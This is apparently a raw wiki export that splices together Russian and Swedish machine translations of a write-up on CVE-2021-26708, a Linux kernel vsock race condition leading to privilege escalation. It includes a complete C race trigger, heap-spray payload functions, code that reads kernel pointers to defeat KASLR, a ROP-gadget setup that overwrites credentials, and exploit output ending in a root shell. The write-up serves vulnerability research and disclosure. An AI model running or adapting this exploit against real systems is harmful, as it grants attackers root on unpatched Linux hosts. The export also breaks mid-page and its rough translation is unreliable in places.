Условное соревнование по виртуальным розеткам;
Вызов msgsnd () сразу после второго connect (); msg_msg помещается в позицию virtio_vsock_sock для уничтожения;
Указатель безопасности теперь уничтоженного msg_msg хранит адрес исходного msg_msg (из шага 2);

[[File:T01a2a2d47c9494c4a5.png | 600px ]]

Если повреждение памяти msg_msg.security из потока setsockopt () происходит во время обработки msgsnd (), проверка разрешений SELinux не выполняется;
В этом случае msgsnd () возвращает -1, и поврежденный msg_msg уничтожается; освобождение msg_msg.security может освободить исходный msg_msg;
Замените исходный msg_msg управляемой полезной нагрузкой:
После сбоя msgsnd () уязвимость вызовет pthread_barrier_wait () и вызовет 127 потоков pthread для распыления кучи;
Эти потоки pthread выполняют полезную нагрузку setxattr ();
Исходный файл msg_msg перезаписывается управляемыми данными, а указатель msg_msg.next сохраняет адрес объекта vsock_sock;

[[File:T0140baae964febb059.png | 600px ]]

Прочтите содержимое объекта ядра vsock_sock в пользовательское пространство, получив сообщение из очереди сообщений, в которой хранится перезаписанный msg_msg:
&lt;pre&gt;
ret = msgrcv(msg_locations[0].msq_id, kmem, ARB_READ_SZ, 0,
                IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
&lt;/pre&gt;

== Найдите цель атаки ==

Вот что я нашел:
1. Выделенный блочный кеш, такой как PINGv6 и sock_inode_cache, имеет много указателей на объекты.
2. Указатель struct mem_cgroup * sk_memcg находится по смещению 664 в vsock_sock.sk. Структура mem_cgroup размещается в блочном кеше kmalloc-4k.
3. Указатель владельца const struct cred * находится по смещению 840 vsock_sock.sk и хранит адрес учетных данных, которые могут быть перезаписаны для повышения разрешения.
4. Указатель функции void (* sk_write_space) (struct sock *) находится по смещению 688 vsock_sock.sk и установлен на адрес функции ядра sock_def_write_space (). Его можно использовать для расчета смещения KASLR.

Вот как уязвимость извлекает эти указатели из памяти:

&lt;pre&gt;
#define SK_MEMCG_RD_LOCATION    (DATALEN_MSG + SK_MEMCG_OFFSET)
#define OWNER_CRED_OFFSET    840
#define OWNER_CRED_RD_LOCATION    (DATALEN_MSG + OWNER_CRED_OFFSET)
#define SK_WRITE_SPACE_OFFSET    688
#define SK_WRITE_SPACE_RD_LOCATION (DATALEN_MSG + SK_WRITE_SPACE_OFFSET) 
/*
 * From Linux kernel 5.10.11-200.fc33.x86_64:
 *   function pointer for calculating KASLR secret
 */
#define SOCK_DEF_WRITE_SPACE    0xffffffff819851b0lu 
unsigned long sk_memcg = 0;
unsigned long owner_cred = 0;
unsigned long sock_def_write_space = 0;
unsigned long kaslr_offset = 0;

/* ... */

    sk_memcg = kmem[SK_MEMCG_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sk_memcg %lx (offset %ld in the leaked kmem)\n",
            sk_memcg, SK_MEMCG_RD_LOCATION);

    owner_cred = kmem[OWNER_CRED_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found owner cred %lx (offset %ld in the leaked kmem)\n",
            owner_cred, OWNER_CRED_RD_LOCATION);

    sock_def_write_space = kmem[SK_WRITE_SPACE_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sock_def_write_space %lx (offset %ld in the leaked kmem)\n",
            sock_def_write_space, SK_WRITE_SPACE_RD_LOCATION);

    kaslr_offset = sock_def_write_space - SOCK_DEF_WRITE_SPACE;
    printf("[+] Calculated kaslr offset: %lx\n", kaslr_offset);
&lt;/pre&gt;

== Реализуйте Use-after-free на sk_buff ==

Сетевой буфер в ядре Linux представлен структурой sk_buff.В этом объекте есть skb_shared_info и destructor_arg, которые можно использовать для перехвата потока управления. Сетевые данные и skb_shared_info помещаются в тот же блок памяти ядра, на который указывает sk_buff.head. Следовательно, создание 2800-байтового сетевого пакета в пользовательском пространстве приведет к тому, что skb_shared_info будет выделен блочному кешу kmalloc-4k, как и объект mem_cgroup.

Я построил следующие шаги:

1. Используйте сокеты (AF_INET, SOCK_DGRAM, IPPROTO_UDP) для создания клиентского сокета и 32 серверных сокетов.

2. Подготовьте буфер размером 2800 байт в пользовательском пространстве и используйте 0x42 для memset ().

3. Используйте sendto (), чтобы отправить этот буфер из клиентского сокета в каждый серверный сокет для создания объектов sk_buff в kmalloc-4k. Используйте sched_setaffinity () на каждом доступном процессоре

4. Выполните произвольный процесс чтения на vsock_sock

5. Рассчитайте возможный адрес ядра sk_buff как sk_memcg плюс 4096 (следующий элемент kmalloc-4k)

6. Произведите произвольное чтение с этого возможного адреса sk_buff.

7. Если вы найдете 0x42424242424242lu в расположении сетевых данных, найдите настоящий sk_buff и переходите к шагу 8. В противном случае добавьте 4096 к возможному адресу sk_buff и перейдите к шагу 6.

8. Выполните спрей setxattr () и userfaultfd () из 32 потоков pthread на sk_buff и повесьте их на pthread_barrier.

9. Произвольно освободить адрес ядра sk_buff

10. Вызовите pthread_barrier_wait (), выполните 32 setxattr (), чтобы покрыть pthreads распыления кучи skb_shared_info.

11. Используйте recv () для получения сетевых сообщений от серверного сокета.

== Свободно пишет через skb_shared_info ==

Ниже приведены допустимые данные, которые перезаписывают объект sk_buff:

&lt;pre&gt;
#define SKB_SIZE        4096
#define SKB_SHINFO_OFFSET    3776
#define MY_UINFO_OFFSET        256
#define SKBTX_DEV_ZEROCOPY    (1 &lt;&lt; 3) 
void prepare_xattr_vs_skb_spray(void)
{
    struct skb_shared_info *info = NULL;

    xattr_addr = spray_data + PAGE_SIZE * 4 - SKB_SIZE + 4;

    /* Don't touch the second part to avoid breaking page fault delivery */
    memset(spray_data, 0x0, PAGE_SIZE * 4);

    info = (struct skb_shared_info *)(xattr_addr + SKB_SHINFO_OFFSET);
    info-&gt;tx_flags = SKBTX_DEV_ZEROCOPY;
    info-&gt;destructor_arg = uaf_write_value + MY_UINFO_OFFSET;

    uinfo_p = (struct ubuf_info *)(xattr_addr + MY_UINFO_OFFSET);
&lt;/pre&gt;

skb_shared_info находится в данных инъекции точно по смещению SKB_SHINFO_OFFSET, которое составляет 3776 байт. Указатель skb_shared_info.destructor_arg хранит адрес struct ubuf_info. Поскольку адрес ядра атакуемого sk_buff известен, поддельный ubuf_info может быть создан в MY_UINFO_OFFSET в сетевом буфере. Ниже приведен макет допустимой полезной нагрузки:

[[File:T0185ccbf9f025c74da.png  | 600px]]

Давайте поговорим о обратном вызове destructor_arg:
&lt;pre&gt;
 /*
     * A single ROP gadget for arbitrary write:
     *   mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rdx + rcx*8], rsi ; ret
     * Here rdi stores uinfo_p address, rcx is 0, rsi is 1
     */
    uinfo_p-&gt;callback = ARBITRARY_WRITE_GADGET + kaslr_offset;
    uinfo_p-&gt;desc = owner_cred + CRED_EUID_EGID_OFFSET; /* value for "qword ptr [rdi + 8]" */
    uinfo_p-&gt;desc = uinfo_p-&gt;desc - 1; /* rsi value 1 should not get into euid */
&lt;/pre&gt;

Поскольку в vmlinuz-5.10.11-200.fc33.x86_64 я не смог найти устройство, которое отвечало бы моим потребностям, я исследовал и сконструировал его сам.

Указатель функции обратного вызова хранит адрес гаджета ROP, RDI хранит первый параметр функции обратного вызова, который является адресом самого ubuf_info, а RDI + 8 указывает на ubuf_info.desc. гаджет перемещает ubuf_info.desc в RDX. Теперь RDX содержит эффективный идентификатор пользователя и адрес идентификатора группы минус один байт. Этот байт очень важен: когда гаджет записывает сообщение 1 от RSI в память, на которую указывает RDX, эффективные uid и gid будут перезаписаны нулем. Повторяйте тот же процесс, пока привилегии не будут повышены до root. Выходной поток всего процесса выглядит следующим образом:
&lt;pre&gt;
[a13x@localhost ~]$ ./vsock_pwn

=================================================
==== CVE-2021-26708 PoC exploit by a13xp0p0v ====
=================================================

[+] begin as: uid=1000, euid=1000
[+] we have 2 CPUs for racing
[+] getting ready...
[+] remove old files for ftok()
[+] spray_data at 0x7f0d9111d000
[+] userfaultfd #1 is configured: start 0x7f0d91121000, len 0x1000
[+] fault_handler for uffd 38 is ready

[+] stage I: collect good msg_msg locations
[+] go racing, show wins: 
    save msg_msg ffff9125c25a4d00 in msq 11 in slot 0
    save msg_msg ffff9125c25a4640 in msq 12 in slot 1
    save msg_msg ffff9125c25a4780 in msq 22 in slot 2
    save msg_msg ffff9125c3668a40 in msq 78 in slot 3

[+] stage II: arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4d00
    kaddr for arb read: ffff9125c2035300
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c2035300 at 0x7f0d91120ff8
[+] go racing, show wins: 

[+] stage III: arbitrary read vsock via good overwritten msg_msg (msq 11)
[+] msgrcv returned 6096 bytes
[+] Found sk_memcg ffff9125c42f9000 (offset 4712 in the leaked kmem)
[+] Found owner cred ffff9125c3fd6e40 (offset 4888 in the leaked kmem)
[+] Found sock_def_write_space ffffffffab9851b0 (offset 4736 in the leaked kmem)
[+] Calculated kaslr offset: 2a000000

[+] stage IV: search sprayed skb near sk_memcg...
[+] checking possible skb location: ffff9125c42fa000
[+] stage IV part I: repeat arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4640
    kaddr for arb read: ffff9125c42fa030
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c42fa030 at 0x7f0d91120ff8
[+] go racing, show wins: 0 0 20 15 42 11 
[+] stage IV part II: arbitrary read skb via good overwritten msg_msg (msq 12)
[+] msgrcv returned 6096 bytes
[+] found a real skb

[+] stage V: try to do UAF on skb at ffff9125c42fa000
[+] skb payload:
    start at 0x7f0d91120004
    skb_shared_info at 0x7f0d91120ec4
    tx_flags 0x8
    destructor_arg 0xffff9125c42fa100
    callback 0xffffffffab64f6d4
    desc 0xffff9125c3fd6e53
[+] go racing, show wins: 15 

[+] stage VI: repeat UAF on skb at ffff9125c42fa000
[+] go racing, show wins: 0 12 13 15 3 12 4 16 17 18 9 47 5 12 13 9 13 19 9 10 13 15 12 13 15 17 30 

[+] finish as: uid=0, euid=0
[+] starting the root shell...
uid=0(root) gid=0(root) groups=0(root),1000(a13x) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
&lt;/pre&gt;

== Видео ==
&lt;youtube&gt;https://www.youtube.com/watch?v=EC8PFOYOUgU&lt;/youtube&gt;


== Ссылка ==
https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html</text>
      <sha1>efg3o2l0g8ua9fxrzhjfkqg9lrxulc4</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26708 Linux kernel before 5.10.13 特權提升漏洞/sv</title>
    <ns>0</ns>
    <id>2248</id>
    <revision>
      <id>2678</id>
      <timestamp>2021-05-06T02:20:18Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Implementera Use-after-free på sk_buff =="</comment>
      <origin>2678</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="26014" sha1="5s975rmx2q0usxaqbzxyfyak6fbgnsu" xml:space="preserve">&lt;languages  /&gt;
== Sårbarhet ==

Dessa sårbarheter är tävlingsförhållanden orsakade av felaktig låsning i &lt;code&gt; net/vmw_vsock/af_vsock.c &lt;/code&gt;. Dessa villkorliga tävlingar introducerades implicit i inlämningen som lade till VSOCK multitransportstöd i november 2019 och slogs samman till Linux-kärnan 5.5-rc1-versionen.

&lt;code&gt; CONFIG_VSOCKETS &lt;/code&gt; och &lt;code&gt; CONFIG_VIRTIO_VSOCKETS &lt;/code&gt; tillhandahålls som kärnmoduler i alla större GNU / Linux-distributioner. När du skapar ett uttag för AF_VSOCK-domänen laddas dessa sårbara moduler automatiskt.
&lt;pre&gt;
vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
&lt;/pre&gt;

Skapandet av &lt;code&gt; AF_VSOCK &lt;/code&gt; -uttag är tillgängligt för icke-privilegierade användare och kräver inte utrymme för användarnamn.


== Minneskorruption ==

Följande är en detaljerad introduktion till användningen av CVE-2021-26708, med användning av den villkorliga konkurrens i &lt;code&gt; vsock_stream_etssockopt () &lt;/code&gt;. Två trådar krävs för att reproducera. Den första tråden anropar &lt;code&gt; setsockopt () &lt;/code&gt;:
&lt;pre&gt;
  setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
                &amp;size, sizeof(unsigned long));
&lt;/pre&gt;



Den andra tråden ändrar den virtuella sockelöverföringen när &lt;code&gt; vsock_stream_etssockopt () &lt;/code&gt; försöker skaffa sockellåset genom att återansluta det virtuella uttaget:
&lt;pre&gt;
struct sockaddr_vm addr = {
        .svm_family = AF_VSOCK,
    };

    addr.svm_cid = VMADDR_CID_LOCAL;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

    addr.svm_cid = VMADDR_CID_HYPERVISOR;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));
&lt;/pre&gt;


För att bearbeta &lt;code&gt; connect () &lt;/code&gt; för det virtuella uttaget kör kärnan &lt;code&gt; vsock_stream_connect () &lt;/code&gt; som kallar &lt;code&gt; vsock_assign_transport () &lt;/code&gt;. Den här funktionen innehåller följande kod:
&lt;pre&gt;
     if (vsk-&gt;transport) {
            if (vsk-&gt;transport == new_transport)
                return 0;

            /* transport-&gt;release() must be called with sock lock acquired.
             * This path can only be taken during vsock_stream_connect(),
             * where we have already held the sock lock.
             * In the other cases, this function is called on a new socket
             * which is not assigned to any transport.
             */
            vsk-&gt;transport-&gt;release(vsk);
            vsock_deassign_transport(vsk);
        }
&lt;/pre&gt;

&lt;code&gt; vsock_stream_connect () &lt;/code&gt; innehåller ett sockellås och &lt;code&gt; vsock_stream_setsockopt () &lt;/code&gt; i den parallella tråden försöker också få det, vilket utgör en villkorad konkurrens. Därför, när den andra &lt;code&gt; connect () &lt;/code&gt; utförs med en annan &lt;code&gt; svm_cid &lt;/code&gt;, kallas funktionen &lt;code&gt; vsock_deassign_transport () &lt;/code&gt;. Den här funktionen kör &lt;code&gt; virtio_transport_destruct () &lt;/code&gt;, släpper &lt;code&gt; vsock_sock.trans &lt;/code&gt; och &lt;code&gt; vsk-&gt; transport &lt;/code&gt; är inställd på NULL. När &lt;code&gt; vsock_stream_connect () &lt;/code&gt; släpper sockellåset kan &lt;code&gt; vsock_stream_setsockopt () &lt;/code&gt; fortsätta att köra. Det kallar &lt;code&gt; vsock_update_buffer_size () &lt;/code&gt; och ringer sedan &lt;code&gt; transport-&gt; notify_buffer_size () &lt;/code&gt;. Här innehåller transport ett föråldrat värde från en lokal variabel, som inte matchar &lt;code&gt; vsk-&gt; transport &lt;/code&gt; (det ursprungliga värdet är satt till NULL).

När kärnan kör &lt;code&gt; virtio_transport_notify_buffer_size () &lt;/code&gt; uppstår minneskorruption:
&lt;pre&gt;
void virtio_transport_notify_buffer_size(struct vsock_sock *vsk, u64 *val)
{
    struct virtio_vsock_sock *vvs = vsk-&gt;trans;

    if (*val &gt; VIRTIO_VSOCK_MAX_BUF_SIZE)
        *val = VIRTIO_VSOCK_MAX_BUF_SIZE;

    vvs-&gt;buf_alloc = *val;

    virtio_transport_send_credit_update(vsk, VIRTIO_VSOCK_TYPE_STREAM, NULL);
}
&lt;/pre&gt;

Här är vvs en pekare till kärnminnet, som har släppts i &lt;code&gt; virtio_transport_destruct () &lt;/code&gt;. Storleken på &lt;code&gt; struct virtio_vsock_sock &lt;/code&gt; är 64 byte och ligger i kmalloc-64 blockcache. Fälttypen buf_alloc är u32 och ligger vid förskjutning 40. &lt;kod&gt; VIRTIO_VSOCK_MAX_BUF_SIZE är 0xFFFFFFFFUL &lt;/code&gt;. Värdet på * val styrs av angriparen och dess fyra minst viktiga byte skrivs in i det frigjorda minnet.


== Fuzzing ==

Syzkaller-fuzzer har inget sätt att reproducera denna krasch, så jag bestämde mig för att studera den själv. Men varför misslyckas fuzzer? Observera &lt;code&gt; vsock_update_buffer_size () &lt;/code&gt; och ta reda på:
&lt;pre&gt;
 if (val != vsk-&gt;buffer_size &amp;&amp;
      transport &amp;&amp; transport-&gt;notify_buffer_size)
        transport-&gt;notify_buffer_size(vsk, &amp;val);

    vsk-&gt;buffer_size = val;

&lt;/pre&gt;

Endast när val skiljer sig från den aktuella buffertstorleken kommer &lt;code&gt; notify_buffer_size () &lt;/code&gt; att kallas, det vill säga när &lt;code&gt; setsockopt () &lt;/code&gt; kör &lt;code&gt; SO_VM_SOCKETS_BUFFER_SIZE &lt;/code&gt;, varje gång Samtalsstorlekens parametrar bör vara olika. Så jag byggde den relevanta koden:
&lt;pre&gt;
/*
 * AF_VSOCK vulnerability trigger.
 * It's a PoC just for fun.
 * Author: Alexander Popov &lt;alex.popov@linux.com&gt;.
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;pthread.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;linux/vm_sockets.h&gt;
#include &lt;unistd.h&gt;

#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define MAX_RACE_LAG_USEC 50

int vsock = -1;
int tfail = 0;
pthread_barrier_t barrier;

int thread_sync(long lag_nsec)
{
	int ret = -1;
	struct timespec ts0;
	struct timespec ts;
	long delta_nsec = 0;

	ret = pthread_barrier_wait(&amp;barrier);
	if (ret != 0 &amp;&amp; ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		perror("[-] pthread_barrier_wait");
		return EXIT_FAILURE;
	}

	ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts0);
	if (ret != 0) {
		perror("[-] clock_gettime");
		return EXIT_FAILURE;
	}

	while (delta_nsec &lt; lag_nsec) {
		ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts);
		if (ret != 0) {
			perror("[-] clock_gettime");
			return EXIT_FAILURE;
		}

		delta_nsec = (ts.tv_sec - ts0.tv_sec) * 1000000000 +
						ts.tv_nsec - ts0.tv_nsec;
	}

	return EXIT_SUCCESS;
}

void *th_connect(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
	};

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	addr.svm_cid = VMADDR_CID_LOCAL;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	addr.svm_cid = VMADDR_CID_HYPERVISOR;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	return NULL;
}

void *th_setsockopt(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct timespec tp;
	unsigned long size = 0;

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	clock_gettime(CLOCK_MONOTONIC, &amp;tp);
	size = tp.tv_nsec;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
						&amp;size, sizeof(unsigned long));

	return NULL;
}

int main(void)
{
	int ret = -1;
	unsigned long size = 0;
	long loop = 0;
	pthread_t th[2] = { 0 };

	vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (vsock == -1)
		err_exit("[-] open vsock");

	printf("[+] AF_VSOCK socket is opened\n");

	size = 1;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE,
						&amp;size, sizeof(unsigned long));
	size = 0xfffffffffffffffdlu;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE,
						&amp;size, sizeof(unsigned long));

	ret = pthread_barrier_init(&amp;barrier, NULL, 2);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");

	for (loop = 0; loop &lt; 30000; loop++) {
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		printf("race loop %ld: tmo1 %ld, tmo2 %ld\n", loop, tmo1, tmo2);

		ret = pthread_create(&amp;th[0], NULL, th_connect, &amp;tmo1);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		ret = pthread_create(&amp;th[1], NULL, th_setsockopt, &amp;tmo2);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles\n");
			exit(EXIT_FAILURE);
		}
	}

	ret = close(vsock);
	if (ret)
		perror("[-] close");

	printf("[+] now see your warnings in the kernel log\n");
	return 0;
}
&lt;/pre&gt;

Storleksvärdet här hämtas från antalet nanosekunder som returneras av &lt;code&gt; clock_gettime () &lt;/code&gt;, vilket kan skilja sig åt varje gång. Den ursprungliga syzkaller gör inte detta, för när syzkaller genererar fuzzing input bestäms värdet på syscall-parametern och kommer inte att ändras under körningen.

== Kraften i fyra byte ==

Här väljer jag Fedora 33 Server som forskningsmål, kärnversionen är 5.10.11-200.fc33.x86_64, och jag är fast besluten att kringgå SMEP och SMAP.

I det första steget började jag studera stabil högsprutning, som utnyttjade utförandet av användarutrymmesaktiviteter för att få kärnan att allokera ett annat 64-byte-objekt på platsen för det frigivna virtio_vsock_socken. Efter flera experimentella försök bekräftades det att den frigjorda virtio_vsock_socken var överskriven, vilket tyder på att högsprutning är genomförbar. Slutligen hittade jag msgsnd () syscall. Det skapar struct msg_msg i kärnutrymmet, se pahole-utdata:
&lt;pre&gt;
struct msg_msg {
    struct list_head           m_list;               /*     0    16 */
    long int                   m_type;               /*    16     8 */
    size_t                     m_ts;                 /*    24     8 */
    struct msg_msgseg *        next;                 /*    32     8 */
    void *                     security;             /*    40     8 */

    /* size: 48, cachelines: 1, members: 5 */
    /* last cacheline: 48 bytes */
};
&lt;/pre&gt;

Framsidan är meddelandehuvudet och baksidan är meddelandedata. Om strukturen msgbuf i användarutrymmet har en 16-byte mtext kommer motsvarande msg_msg att skapas i kmalloc-64-blockcachen. En 4-byte skriv-efter-fri förstör tomrum * säkerhetspekaren vid förskjutning 40. Fältet msg_msg.security pekar på kärndata som tilldelats av lsm_msg_msg_alloc (). När msg_msg tas emot kommer den att släppas av security_msg_msg_free (). Därför kan godtycklig frihet erhållas genom att förstöra säkerhetspekarens första hälft.

== Kärninformationsläckage ==

Här används [https://www.pwnwiki.org/index.php?title=CVE-2019-18683_Linux_kernel_through_5.3.8_%E7%89%B9%E6%AC%8A%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E CVE-2019-18683] samma teknik. Den andra anslutningen () av ​​det virtuella uttaget anropar &lt;code&gt; vsock_deassign_transport () &lt;/code&gt; och ställer &lt;code&gt; vsk-&gt; transport &lt;/code&gt; till NULL, vilket gör &lt;code&gt; vsock_stream_setsockopt () &lt;/code&gt; Ringer &lt;code&gt; virtio_transport_send_pkt_info () &lt;/code&gt; efter minneskraschen visas en kärnvarning:
&lt;pre&gt;
WARNING: CPU: 1 PID: 6739 at net/vmw_vsock/virtio_transport_common.c:34
...
CPU: 1 PID: 6739 Comm: racer Tainted: G        W         5.10.11-200.fc33.x86_64 #1
Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.13.0-2.fc32 04/01/2014
RIP: 0010:virtio_transport_send_pkt_info+0x14d/0x180 [vmw_vsock_virtio_transport_common]
...
RSP: 0018:ffffc90000d07e10 EFLAGS: 00010246
RAX: 0000000000000000 RBX: ffff888103416ac0 RCX: ffff88811e845b80
RDX: 00000000ffffffff RSI: ffffc90000d07e58 RDI: ffff888103416ac0
RBP: 0000000000000000 R08: 00000000052008af R09: 0000000000000000
R10: 0000000000000126 R11: 0000000000000000 R12: 0000000000000008
R13: ffffc90000d07e58 R14: 0000000000000000 R15: ffff888103416ac0
FS:  00007f2f123d5640(0000) GS:ffff88817bd00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007f81ffc2a000 CR3: 000000011db96004 CR4: 0000000000370ee0
Call Trace:
  virtio_transport_notify_buffer_size+0x60/0x70 [vmw_vsock_virtio_transport_common]
  vsock_update_buffer_size+0x5f/0x70 [vsock]
  vsock_stream_setsockopt+0x128/0x270 [vsock]
...
&lt;/pre&gt;
Genom gdb-felsökning visar det sig att RCX-registret innehåller kärnadressen till den frigjorda virtio_vsock_socken, och RBX-registret innehåller kärnadressen till vsock_sock.

== Uppnå godtycklig läsning ==

===From arbitrary free to use-after-free===

Släpp ett objekt från den läckta kärnadressen
Utför högspray och täck föremålet med kontrollerade data
Använd skadade föremål för eskalering av privilegier
System V-meddelandet som implementeras av kärnan har en maximal gräns på DATALEN_MSG, det vill säga PAGE_SIZE minus sizeof (struct msg_msg)). Om du skickar ett större meddelande sparas de återstående meddelandena i listan över meddelandesegment. Msg_msg innehåller strukturen msg_msgseg * bredvid peka på det första segmentet och size_t m_ts används för att lagra storleken. När du utför en överskrivningsoperation kan du sätta det kontrollerade värdet i msg_msg.m_ts och msg_msg.next:

[[File:T01a51dfe7a996e854c.png | 600px ]]


Payload:
&lt;pre&gt;
    #define PAYLOAD_SZ 40 
    void adapt_xattr_vs_sysv_msg_spray(unsigned long kaddr)
    {
        struct msg_msg *msg_ptr;

        xattr_addr = spray_data + PAGE_SIZE * 4 - PAYLOAD_SZ;

        /* Don't touch the second part to avoid breaking page fault delivery */
        memset(spray_data, 0xa5, PAGE_SIZE * 4);

        printf("[+] adapt the msg_msg spraying payload:\n");
        msg_ptr = (struct msg_msg *)xattr_addr;
        msg_ptr-&gt;m_type = 0x1337;
        msg_ptr-&gt;m_ts = ARB_READ_SZ;
        msg_ptr-&gt;next = (struct msg_msgseg *)kaddr; /* set the segment ptr for arbitrary read */
        printf("\tmsg_ptr %p\n\tm_type %lx at %p\n\tm_ts %zu at %p\n\tmsgseg next %p at %p\n",
               msg_ptr,
               msg_ptr-&gt;m_type, &amp;(msg_ptr-&gt;m_type),
               msg_ptr-&gt;m_ts, &amp;(msg_ptr-&gt;m_ts),
               msg_ptr-&gt;next, &amp;(msg_ptr-&gt;next));
    }
&lt;/pre&gt;
Men hur använder jag msg_msg för att läsa kärndata? Genom att läsa systemanropsdokumentet msgrcv () hittade jag en bra lösning med hjälp av msgrcv () och MSG-flaggor:
&lt;pre&gt;
MSG_COPY (since Linux 3.8)
        Nondestructively fetch a copy of the message at the ordinal position  in  the  queue
        specified by msgtyp (messages are considered to be numbered starting at 0).
&lt;/pre&gt;
Denna flagga gör att kärnan kopierar meddelandedata till användarutrymmet utan att radera den från meddelandekön. Om kärnan har CONFIG_CHECKPOINT_RESTORE = y är MSG tillgängligt och tillämpligt i Fedora Server.

=== Steg för godtycklig läsning ===

Redo att jobba:
Använd sched_getaffinity () och CPU_COUNT () för att beräkna antalet tillgängliga processorer (minst två krävs för denna sårbarhet);
Öppna / dev / kmsg för analys;
mmap () konfigurerar userfaultfd () i spray_data-minnesområdet som den sista delen;
Starta en separat pthread för att hantera userfaultfd () -händelser;
Starta 127 trådar för setxattr () &amp; userfaultfd () heap spray på msg_msg och häng dem på thread_barrier;
Hämta kärnadressen till den ursprungliga msg_msg:
Villkorlig konkurrens på virtuella uttag;
Efter den andra anslutningen () väntar du 35 mikrosekunder i den upptagna slingan;
Ring msgsnd () för att skapa en separat meddelandekö; efter minneskorruption placeras msg_msg-objektet i virtio_vsock_sock-positionen;
Analysera kärnloggen och spara kärnadressen för msg_msg från kärnvarningen (RCX-register);
Spara samtidigt kärnadressen till vsock_sock från RBX-registret;
Använd den skadade msg_msg för att utföra godtycklig release av den ursprungliga msg_msg:
Använd 4 byte av den ursprungliga msg_msg-adressen som SO_VM_SOCKETS_BUFFER_SIZE för att uppnå minneskorruption.
Villkorlig konkurrens på virtuella uttag;
Ring msgsnd () omedelbart efter den andra anslutningen (); msg_msg placeras i positionen virtio_vsock_sock för att uppnå förstörelse;
Säkerhetspekaren för den nu förstörda msg_msg lagrar adressen till den ursprungliga msg_msg (från steg 2);

[[File:T01a2a2d47c9494c4a5.png | 600px ]]

Om msg_msg.security-minneskorruptionen från setsockopt () -tråden inträffar under bearbetningen av msgsnd () misslyckas SELinux-behörighetskontrollen;
I det här fallet returnerar msgsnd () -1 och den skadade msg_msg förstörs; släppande av msg_msg.security kan släppa originalet msg_msg;
Skriv över originalet msg_msg med en kontrollerbar nyttolast:
Efter att msgsnd () misslyckas kommer sårbarheten att ringa pthread_barrier_wait () och ringa 127 pthreads för högsprutning;
Dessa pthreads kör nyttolasten för setxattr ();
Den ursprungliga msg_msg skrivs över av kontrollerbar data, och pekaren msg_msg.next lagrar adressen till vsock_sock-objektet;

[[File:T0140baae964febb059.png | 600px ]]

Läs innehållet i kärnobjektet vsock_sock till användarutrymmet genom att ta emot meddelandet från meddelandekön som lagrar det överskrivna msg_msg:
&lt;pre&gt;
ret = msgrcv(msg_locations[0].msq_id, kmem, ARB_READ_SZ, 0,
                IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
&lt;/pre&gt;

== Hitta målet för attack ==

Här är de punkter jag hittade:
1. Dedikerad blockcache, till exempel PINGv6 och sock_inode_cache, har många pekare på objekt
2. Struct mem_cgroup * sk_memcg-pekaren är vid offset 664 i vsock_sock.sk. Mem_cgroup-strukturen tilldelas i kmalloc-4k blockcache.
3. Pekaren för const struct cred * -ägaren är vid offset 840 i vsock_sock.sk och lagrar adressen för referensen som kan skrivas över för tillståndsupptrappning.
4. Tomrumsfunktionen (* sk_write_space) (struct sock *) är vid offset 688 för vsock_sock.sk och är inställd på adressen till kärnfunktionen sock_def_write_space (). Den kan användas för att beräkna KASLR-offset.

